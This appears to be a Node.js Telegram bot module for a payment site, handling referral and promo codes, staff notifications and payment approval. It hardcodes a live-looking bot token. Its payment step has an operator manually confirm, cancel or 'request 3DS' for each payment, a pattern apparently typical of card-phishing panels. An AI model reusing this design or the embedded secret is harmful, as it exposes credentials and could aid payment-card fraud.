const TelegramBot = require('node-telegram-bot-api');
const StaffService = require('./staff-service');
const PromoCodeService = require('./promocode-service');

class BotService {
    constructor() {
        this.bot = new TelegramBot("8216977215:AAEqwBaREu4vZvz4yj6d5ICZp5xgyZ8vQjY", { polling: true });
        this.pendingCallbacks = new Map();
        
        // Чат ID из переменных окружения
        this.ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || 7209588642;
        this.STAFF_CHAT_ID = process.env.STAFF_CHAT_ID;
        
        // ID админов и сотрудников
        this.ADMIN_IDS = this.parseIds(process.env.STAFF_ADMIN_IDS);
        this.STAFF_IDS = this.parseIds(process.env.STAFF_USER_IDS);
        
        // Delete webhook if set
        this.bot.deleteWebHook().then(() => {
            console.log('Webhook deleted, using polling');
        }).catch(err => {
            console.log('Error deleting webhook:', err.message);
        });

        // Initialize staff members from environment variables
        this.initializeStaff();
        
        // Register commands for managing referrals and promo codes
        this.registerCommands();
        
        // Global handler for all callbacks
        this.bot.on('callback_query', async (callbackQuery) => {
            const messageId = callbackQuery.message.message_id;
            const chatId = callbackQuery.message.chat.id;
            
            console.log('Received callback:', { messageId, data: callbackQuery.data });
            console.log('Available messageId in pendingCallbacks:', Array.from(this.pendingCallbacks.keys()));
            
            if (this.pendingCallbacks.has(messageId)) {
                const { resolve, timeout, originalMessage } = this.pendingCallbacks.get(messageId);
                clearTimeout(timeout);
                this.pendingCallbacks.delete(messageId);
                
                if (callbackQuery.data === 'confirm') {
                    console.log('>>> CONFIRM BUTTON PRESSED <<<');
                    await this.bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Payment confirmed' });
                    await this.bot.editMessageText(
                        `${originalMessage}\n\n✅ Status: CONFIRMED`,
                        {
                            chat_id: chatId,
                            message_id: messageId
                        }
                    );
                    console.log('Sending result: { confirmed: true }');
                    resolve({ confirmed: true });
                } else if (callbackQuery.data === 'request_3ds') {
                    console.log('>>> 3DS BUTTON PRESSED <<<');
                    await this.bot.answerCallbackQuery(callbackQuery.id, { text: '🔐 3DS verification request' });
                    await this.bot.editMessageText(
                        `${originalMessage}\n\n🔐 Status: WAITING FOR 3DS VERIFICATION`,
                        {
                            chat_id: chatId,
                            message_id: messageId
                        }
                    );
                    console.log('Sending result: { requires3DS: true }');
                    resolve({ requires3DS: true });
                } else if (callbackQuery.data === 'cancel') {
                    console.log('>>> CANCEL BUTTON PRESSED <<<');
                    await this.bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Payment cancelled' });
                    await this.bot.editMessageText(
                        `${originalMessage}\n\n❌ Status: CANCELLED`,
                        {
                            chat_id: chatId,
                            message_id: messageId
                        }
                    );
                    console.log('Sending result: { confirmed: false, reason: "cancelled" }');
                    resolve({ confirmed: false, reason: 'cancelled' });
                }
            } else {
                console.log('Callback for messageId not found in pendingCallbacks');
            }
        });
    }

    async sendMessageAndWait(chatId, message, buttonPayment) {
        // Generate unique temporary ID for this request
        const tempId = `_pending_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        // Create Promise for waiting response
        const waitPromise = new Promise((resolve) => {
            const timeout = setTimeout(() => {
                // Delete from both possible places (temporary and real ID)
                this.pendingCallbacks.delete(tempId);
                console.log('Confirmation timeout');
                resolve({ confirmed: false, reason: 'timeout' });
            }, 300000); // 5 minutes timeout
            
            // Save with unique temporary key
            this.pendingCallbacks.set(tempId, { resolve, timeout, originalMessage: message });
        });

        // Send message
        const sentMessage = await this.bot.sendMessage(chatId, message, buttonPayment);
        const messageId = sentMessage.message_id;
        console.log('Message sent to Telegram, messageId:', messageId);
        
        // Replace temporary entry with real messageId
        const pendingData = this.pendingCallbacks.get(tempId);
        if (pendingData) {
            this.pendingCallbacks.delete(tempId);
            this.pendingCallbacks.set(messageId, pendingData);
            console.log('Waiting for confirmation for messageId:', messageId);
        } else {
            console.error('ERROR: Data not found for tempId:', tempId);
        }

        return waitPromise;
    }

    // Парсинг ID из строки переменной окружения
    parseIds(envString) {
        if (!envString) return [];
        return envString.split(',')
            .map(id => parseInt(id.trim()))
            .filter(id => !isNaN(id));
    }

    // Инициализация сотрудников из переменных окружения
    async initializeStaff() {
        try {
            // Добавляем админов
            for (const adminId of this.ADMIN_IDS) {
                try {
                    const user = await this.bot.getChat(adminId);
                    await StaffService.addStaff(
                        adminId,
                        user.username,
                        user.first_name,
                        user.last_name,
                        'admin',
                        {
                            canCreatePromoCodes: true,
                            canViewStats: true,
                            canManageUsers: true
                        }
                    );
                    console.log(`✅ Admin initialized: ${user.first_name} ${user.last_name}`);
                } catch (error) {
                    console.warn(`⚠️  Could not initialize admin ${adminId}:`, error.message);
                }
            }

            // Добавляем сотрудников
            for (const staffId of this.STAFF_IDS) {
                try {
                    const user = await this.bot.getChat(staffId);
                    await StaffService.addStaff(
                        staffId,
                        user.username,
                        user.first_name,
                        user.last_name,
                        'staff',
                        {
                            canCreatePromoCodes: true,
                            canViewStats: true,
                            canManageUsers: false
                        }
                    );
                    console.log(`✅ Staff initialized: ${user.first_name} ${user.last_name}`);
                } catch (error) {
                    console.warn(`⚠️  Could not initialize staff ${staffId}:`, error.message);
                }
            }
        } catch (error) {
            console.error('❌ Error initializing staff:', error.message);
        }
    }

    // Проверка доступа к чату
    isAdminChat(chatId) {
        return chatId.toString() === this.ADMIN_CHAT_ID.toString();
    }

    isStaffChat(chatId) {
        return this.STAFF_CHAT_ID && chatId.toString() === this.STAFF_CHAT_ID.toString();
    }

    isPrivateChat(chatId) {
        return chatId > 0;
    }

    // Определение типа чата
    getChatType(chatId) {
        if (this.isAdminChat(chatId)) return 'admin_chat';
        if (this.isStaffChat(chatId)) return 'staff_chat';
        if (this.isPrivateChat(chatId)) return 'private';
        return 'unknown';
    }

    registerCommands() {
        const referralService = require('./referral-service');

        // ===== РЕФЕРАЛЬНЫЕ КОДЫ (только админ-чат) =====
        
        // Command /refstats - code statistics
        this.bot.onText(/\/refstats (.+)/, async (msg, match) => {
            if (!this.isAdminChat(msg.chat.id)) return;
            
            const code = match[1].trim().toUpperCase();
            try {
                const stats = await referralService.getReferralStats(code);
                const message = this.formatReferralStats(stats);
                await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
            }
        });

        // Command /reflink - get link for code
        this.bot.onText(/\/reflink (.+)/, async (msg, match) => {
            if (!this.isAdminChat(msg.chat.id)) return;
            
            const code = match[1].trim().toUpperCase();
            const ReferralCodeModel = require('../models/referral-code-model');
            
            try {
                const referralCode = await ReferralCodeModel.findOne({ code });
                
                if (!referralCode) {
                    await this.bot.sendMessage(msg.chat.id, `❌ Code <b>${code}</b> not found`, { parse_mode: 'HTML' });
                    return;
                }
                
                const siteUrl = process.env.CLIENT_URL || 'http://localhost:3000';
                const referralLink = `${siteUrl}/?ref=${code}`;
                const status = referralCode.isActive ? '✅ Active' : '❌ Inactive';
                
                const message = `🔗 <b>Referral link for code: ${code}</b>\n\n` +
                    `<b>Name:</b> ${referralCode.name}\n` +
                    `<b>Status:</b> ${status}\n\n` +
                    `<b>Link:</b>\n<code>${referralLink}</code>\n\n` +
                    `<i>Copy and use this link</i>`;
                
                await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
            }
        });

        // Command /reflist - list of all codes
        this.bot.onText(/\/reflist/, async (msg) => {
            if (!this.isAdminChat(msg.chat.id)) return;
            
            try {
                const stats = await referralService.getAllStats();
                const message = this.formatAllReferralStats(stats);
                await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
            }
        });

        // Command /refcreate - create new code
        this.bot.onText(/\/refcreate\s+(.+)/, async (msg, match) => {
            if (!this.isAdminChat(msg.chat.id)) return;
            
            const args = match[1].trim().split(/\s+/);
            
            if (args.length < 2) {
                await this.bot.sendMessage(
                    msg.chat.id, 
                    `❌ Wrong command format!\n\n<b>Usage:</b>\n/refcreate CODE NAME\n\n<b>Example:</b>\n/refcreate PROMO2024 New Year Promo`, 
                    { parse_mode: 'HTML' }
                );
                return;
            }
            
            const code = args[0].toUpperCase();
            const name = args.slice(1).join(' ');
            
            try {
                await referralService.createReferralCode(code, name);
                
                const siteUrl = process.env.CLIENT_URL || 'http://localhost:3000';
                const referralLink = `${siteUrl}/?ref=${code}`;
                
                const message = `✅ Referral code created!\n\n` +
                    `<b>Code:</b> ${code}\n` +
                    `<b>Name:</b> ${name}\n\n` +
                    `<b>🔗 Referral link:</b>\n` +
                    `<code>${referralLink}</code>\n\n` +
                    `<i>Use this link to attract users</i>`;
                
                await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
            }
        });

        // Command /reftoggle - activate/deactivate code
        this.bot.onText(/\/reftoggle (.+)/, async (msg, match) => {
            if (!this.isAdminChat(msg.chat.id)) return;
            
            const code = match[1].trim().toUpperCase();
            
            try {
                // First get current status
                const ReferralCodeModel = require('../models/referral-code-model');
                const currentCode = await ReferralCodeModel.findOne({ code });
                if (!currentCode) {
                    await this.bot.sendMessage(msg.chat.id, `❌ Code <b>${code}</b> not found`, { parse_mode: 'HTML' });
                    return;
                }
                
                // Toggle status
                const referralCode = await referralService.toggleReferralCode(code, !currentCode.isActive);
                const status = referralCode.isActive ? '✅ activated' : '❌ deactivated';
                await this.bot.sendMessage(msg.chat.id, `Code <b>${code}</b> ${status}`, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
            }
        });

        // Command /help - command list
        this.bot.onText(/\/help/, async (msg) => {
            if (!this.isAdminChat(msg.chat.id)) return;
            
            const helpMessage = `
<b>📊 Referral management commands:</b>

/refcreate CODE NAME - create code
/reflink CODE - get link
/refstats CODE - code statistics
/reflist - list all codes
/reftoggle CODE - on/off code
/help - this help

<b>Examples:</b>
/refcreate PROMO2024 2024 Promo
/reflink PROMO2024
/refstats PROMO2024
/reftoggle PROMO2024
            `;
            
            await this.bot.sendMessage(msg.chat.id, helpMessage, { parse_mode: 'HTML' });
        });

        // ===== ПРОМОКОДЫ (личные сообщения) =====
        
        // Command /promocreate - create promo code (private chat only)
        this.bot.onText(/\/promocreate\s+(.+)/, async (msg, match) => {
            if (!this.isPrivateChat(msg.chat.id)) return;
            
            const telegramId = msg.from.id;
            const args = match[1].trim().split(/\s+/);
            
            try {
                if (args.length < 3) {
                    await this.bot.sendMessage(
                        msg.chat.id,
                        `❌ Wrong command format!\n\n<b>Usage:</b>\n/promocreate CODE NAME VALUE [TYPE]\n\n<b>Examples:</b>\n/promocreate SAVE20 Save 20% 20 discount\n/promocreate BONUS50 Bonus 50 AXION 50 bonus`,
                        { parse_mode: 'HTML' }
                    );
                    return;
                }
                
                const code = args[0].toUpperCase();
                const name = args[1];
                const value = parseFloat(args[2]);
                const type = args[3] || 'discount';
                
                if (isNaN(value)) {
                    await this.bot.sendMessage(msg.chat.id, '❌ Value must be a number');
                    return;
                }
                
                const promoData = {
                    code,
                    name,
                    value,
                    type: ['discount', 'bonus', 'referral'].includes(type) ? type : 'discount'
                };
                
                const promoCode = await PromoCodeService.createPromoCode(telegramId, promoData);
                
                const message = `✅ Promo code created!\n\n` +
                    `🎫 <b>Code:</b> ${promoCode.code}\n` +
                    `📌 <b>Name:</b> ${promoCode.name}\n` +
                    `🏷️ <b>Type:</b> ${promoCode.type}\n` +
                    `💰 <b>Value:</b> ${promoCode.value}${promoCode.type === 'discount' ? '%' : ' ' + promoCode.currency}\n\n` +
                    `<i>Use /promostats ${code} to view statistics</i>`;
                
                await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
            }
        });

        // Command /promostats - promo code statistics (private chat only)
        this.bot.onText(/\/promostats (.+)/, async (msg, match) => {
            if (!this.isPrivateChat(msg.chat.id)) return;
            
            const telegramId = msg.from.id;
            const code = match[1].trim().toUpperCase();
            
            try {
                const stats = await PromoCodeService.getPromoCodeStats(code, telegramId);
                const message = PromoCodeService.formatPromoCodeStats(stats);
                await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
            }
        });

        // Command /promolist - list user's promo codes (private chat only)
        this.bot.onText(/\/promolist/, async (msg) => {
            if (!this.isPrivateChat(msg.chat.id)) return;
            
            const telegramId = msg.from.id;
            
            try {
                const promoCodes = await PromoCodeService.getStaffPromoCodes(telegramId);
                
                if (promoCodes.length === 0) {
                    await this.bot.sendMessage(
                        msg.chat.id,
                        '📝 <b>No promo codes found</b>\n\nUse /promocreate to create your first promo code!',
                        { parse_mode: 'HTML' }
                    );
                    return;
                }
                
                let message = '<b>🎫 Your Promo Codes:</b>\n\n';
                
                promoCodes.forEach((code, index) => {
                    const status = code.isActive ? '✅' : '❌';
                    const type = code.type === 'discount' ? 'Discount' : code.type === 'bonus' ? 'Bonus' : 'Referral';
                    const value = code.type === 'discount' ? `${code.value}%` : `${code.value} ${code.currency}`;
                    
                    message += `${index + 1}. ${status} <b>${code.code}</b> - ${code.name}\n`;
                    message += `   🏷️ ${type} | 💰 ${value} | 🔢 Used: ${code.usedCount}\n\n`;
                });
                
                message += '<i>Use /promostats CODE for detailed information</i>';
                
                await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
            }
        });

        // Command /promotoggle - activate/deactivate promo code (private chat only)
        this.bot.onText(/\/promotoggle (.+)/, async (msg, match) => {
            if (!this.isPrivateChat(msg.chat.id)) return;
            
            const telegramId = msg.from.id;
            const code = match[1].trim().toUpperCase();
            
            try {
                const promoCode = await PromoCodeService.togglePromoCode(code, telegramId);
                const status = promoCode.isActive ? '✅ activated' : '❌ deactivated';
                await this.bot.sendMessage(msg.chat.id, `Promo code <b>${code}</b> ${status}`, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
            }
        });

        // Command /promohelp - help for promo codes (private chat only)
        this.bot.onText(/\/promohelp/, async (msg) => {
            if (!this.isPrivateChat(msg.chat.id)) return;
            
            const helpMessage = `
<b>🎫 Promo Code Commands:</b>

/promocreate CODE NAME VALUE [TYPE] - create promo code
/promostats CODE - view promo code statistics
/promolist - list your promo codes
/promotoggle CODE - activate/deactivate promo code
/promohelp - this help

<b>Types:</b>
• discount - percentage discount (1-100)
• bonus - fixed amount bonus
• referral - referral bonus

<b>Examples:</b>
/promocreate SAVE20 Save 20% 20 discount
/promocreate BONUS50 Bonus 50 AXION 50 bonus
/promostats SAVE20
            `;
            
            await this.bot.sendMessage(msg.chat.id, helpMessage, { parse_mode: 'HTML' });
        });

        // ===== УВЕДОМЛЕНИЯ =====
        
        // Отправка уведомления о регистрации в чат сотрудников
        this.sendRegistrationNotification = async (email, referralCode = null) => {
            if (!this.STAFF_CHAT_ID) return;
            
            try {
                const message = `🎉 <b>New Registration!</b>\n\n` +
                    `📧 <b>Email:</b> ${email}\n` +
                    `${referralCode ? `🔗 <b>Referral Code:</b> ${referralCode}\n` : ''}` +
                    `⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
                
                await this.bot.sendMessage(this.STAFF_CHAT_ID, message, { parse_mode: 'HTML' });
            } catch (error) {
                console.error('Error sending registration notification to staff chat:', error);
            }
        };

        // Отправка уведомления о платеже в админ-чат
        this.sendPaymentNotification = async (email, amount, transactionId, referralCode = null) => {
            try {
                const message = `💰 <b>New Payment!</b>\n\n` +
                    `📧 <b>Email:</b> ${email}\n` +
                    `💵 <b>Amount:</b> ${amount} AXION\n` +
                    `🆔 <b>Transaction ID:</b> ${transactionId}\n` +
                    `${referralCode ? `🔗 <b>Referral Code:</b> ${referralCode}\n` : ''}` +
                    `⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
                
                await this.bot.sendMessage(this.ADMIN_CHAT_ID, message, { parse_mode: 'HTML' });
            } catch (error) {
                console.error('Error sending payment notification to admin chat:', error);
            }
        };
    }

    formatReferralStats(stats) {
        return `
<b>📊 Code statistics: ${stats.code}</b>

📌 Name: ${stats.name}
${stats.isActive ? '✅' : '❌'} Status: ${stats.isActive ? 'Active' : 'Inactive'}

<b>Statistics:</b>
👥 Registrations: ${stats.stats.totalRegistrations}
💳 Payments: ${stats.stats.totalPayments}
💰 Amount: ${stats.stats.totalAmount}
📈 Conversion: ${stats.stats.conversionRate}
✅ Users with payments: ${stats.stats.usersWithPayments}
        `;
    }

    formatAllReferralStats(statsList) {
        if (!statsList || statsList.length === 0) {
            return '📊 <b>Referral codes not found</b>\n\nUse /refcreate to create';
        }

        let message = '<b>📊 All referral codes:</b>\n\n';
        
        statsList.forEach((stats, index) => {
            const status = stats.isActive ? '✅' : '❌';
            message += `${index + 1}. ${status} <b>${stats.code}</b> - ${stats.name}\n`;
            message += `   👥 ${stats.stats.totalRegistrations} reg. | 💳 ${stats.stats.totalPayments} payments | 💰 ${stats.stats.totalAmount}\n\n`;
        });

        message += '\n<i>Use /refstats CODE for detailed information</i>';
        
        return message;
    }
}

module.exports = new BotService();